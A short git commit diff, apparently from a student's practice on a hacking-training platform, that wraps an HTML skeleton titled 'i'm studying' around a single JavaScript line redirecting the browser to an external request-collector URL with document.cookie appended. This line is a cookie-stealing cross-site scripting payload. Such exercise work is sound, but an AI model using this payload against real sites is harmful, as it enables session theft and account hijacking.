4d89d33bd44535dec4a9dc1424132a68aa6a1a92
zkvlkat <132288380+zkvlkat@users.noreply.github.com>
2024-01-18 22:00:50 +0900

    Update DH.js

--- DH.js
+++ DH.js
@@ -1,1 +1,13 @@
+
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<title>i'm studying</title>
+<link rel="stylesheet" href="sevice_name.css">
+</head>
+<body>
 location.href="https://nqvflqr.request.dreamhack.games/result="+document.cookie;
+</body>
+</html>
